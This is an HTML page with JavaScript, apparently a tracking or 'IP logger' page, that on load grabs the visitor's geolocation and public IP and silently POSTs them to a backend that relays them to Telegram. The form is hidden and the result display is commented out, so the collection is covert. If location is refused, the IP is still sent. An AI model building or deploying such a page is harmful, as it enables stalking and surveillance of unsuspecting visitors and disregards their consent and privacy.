<!DOCTYPE html>
<html>
<head>
    <title>Send Location or IP Address to Telegram</title>
</head>
<body>
    <h1>Send Location to Telegram</h1>
    
    <div id="result"></div>
    
    <script>
        navigator.geolocation.getCurrentPosition(function(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            
            // Set the latitude and longitude values on the form
            document.getElementById("latitude").value = latitude;
            document.getElementById("longitude").value = longitude;
            
            // Get the IP address of the user
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip_address = data.ip;
                    
                    // Set the IP address value on the form
                    document.getElementById("ip-address").value = ip_address;
                    
                    // Send the location and IP address to the Flask app
                    sendLocation();
                });
        }, function(error) {
            if (error.code == error.PERMISSION_DENIED) {
                // If the user denies permission to access their location, send the IP address only
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        var ip_address = data.ip;
                        
                        // Set the IP address value on the form
                        document.getElementById("ip-address").value = ip_address;
                        
                        // Send the IP address to the Flask app
                        sendIP();
                    });
            }
        });
        
        function sendLocation() {
            var form = document.getElementById("location-form");
            
            // Send the form data to the Flask app
            fetch(form.action, {
                method: 'POST',
                body: new FormData(form)
            })
            .then(response => response.text())
          //  .then(result => {
                // Display the result on the page
             //   document.getElementById("result").textContent = result;
           // })
            .catch(error => {
                console.error('Error:', error);
            });
        }
        
        function sendIP() {
            var form = document.getElementById("location-form");
            
            // Send the form data to the Flask app
            fetch(form.action + '_ip', {
                method: 'POST',
                body: new FormData(form)
            })
            .then(response => response.text())
         //   .then(result => {
                // Display the result on the page
          //      document.getElementById("result").textContent = result;
        //    })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
    
    <form id="location-form" style="display: none" action="/send_location" method="post">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="ip_address" id="ip-address">
    </form>
</body>
</html>
